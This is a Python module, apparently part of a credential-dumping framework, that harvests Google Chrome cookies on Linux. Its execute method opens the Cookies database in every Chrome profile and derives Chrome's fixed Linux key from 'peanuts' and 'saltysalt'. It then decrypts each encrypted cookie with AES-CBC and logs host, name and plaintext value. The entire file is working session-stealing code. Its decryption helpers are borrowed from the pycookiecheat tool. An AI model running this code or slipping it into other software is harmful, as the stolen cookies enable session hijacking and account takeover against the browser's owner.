# coding: utf-8

try:
	import os
	import sqlite3
	from Crypto.Cipher import AES
	from hashlib import pbkdf2_hmac
except ImportError:
	pass

from modules.linux.chrome.chrome_module import ChromeModule


class ChromeCookie(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='ChromeCookie',
			version='0.0.1',
			file=__file__,
			dependencies=['os', 'sqlite3', 'Crypto', 'hashlib'],
		)

	def can(self):
		return super().can()

	def has(self):
		return super().has()

	def execute(self) -> bool:
		if not super().execute():
			return False

		enc_key = pbkdf2_hmac(
			hash_name='sha1',
			password='peanuts'.encode('utf8'),
			salt=b'saltysalt',
			iterations=1,
			dklen=16
		)

		for profile in self.get_profiles():
			cookie_path = profile + '/Cookies'
			if os.path.isfile(cookie_path):
				self.log(profile.split('/')[-1] + ':')
				connection = sqlite3.connect(cookie_path)
				cursor = connection.cursor()
				cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')

				for host_key, name, value, encrypted_value in cursor.fetchall():
					self.log(host_key + ',' + name + ',' + str(value if value else self.decrypt(encrypted_value, enc_key)))

		return True

	# https://github.com/n8henrie/pycookiecheat/blob/master/src/pycookiecheat/pycookiecheat.py
	def clean(self, decrypted: bytes) -> str:
		r"""Strip padding from decrypted value.
		Remove number indicated by padding
		e.g. if last is '\x0e' then ord('\x0e') == 14, so take off 14.
		Args:
			decrypted: decrypted value
		Returns:
			Decrypted stripped of junk padding
		"""
		try:
			last = decrypted[-1]
			if isinstance(last, int):
				return decrypted[:-last].decode('utf8')
			return decrypted[:-ord(last)].decode('utf8')
		except IndexError:
			return 'Uncrackable'

	def decrypt(self, encrypted_value: bytes, key: bytes) -> str:
		"""Decrypt Chrome/Chromium's encrypted cookies.
		Args:
			encrypted_value: Encrypted cookie from Chrome/Chromium's cookie file
			key: Key to decrypt encrypted_value
		Returns:
			Decrypted value of encrypted_value
		"""
		# Encrypted cookies should be prefixed with 'v10' or 'v11' according to the
		# Chromium code. Strip it off.
		try:
			encrypted_value = encrypted_value[3:]

			cipher = AES.new(key, AES.MODE_CBC, IV=b' ' * 16)
			decrypted = cipher.decrypt(encrypted_value)

			return self.clean(decrypted)
		except UnicodeDecodeError:
			return 'Uncrackable'
